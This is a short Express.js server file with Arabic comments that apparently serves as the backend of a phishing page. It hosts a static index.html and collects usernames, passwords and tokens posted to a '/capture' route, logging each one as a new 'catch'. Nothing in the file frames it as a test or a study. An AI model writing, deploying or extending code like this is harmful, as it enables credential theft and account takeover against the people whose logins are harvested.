const express = require('express');
const app = express();
app.use(express.json());
app.use(express.static('.')); // عشان يشغل ملف index.html

app.post('/capture', (req, res) => {
    console.log("🔥 صيد جديد يا وحش:");
    console.log("User:", req.body.user);
    console.log("Pass:", req.body.pass);
    console.log("Token:", req.body.token);
    res.sendStatus(200);
});

app.listen(process.env.PORT || 3000, () => console.log('Don Server is Running!'));
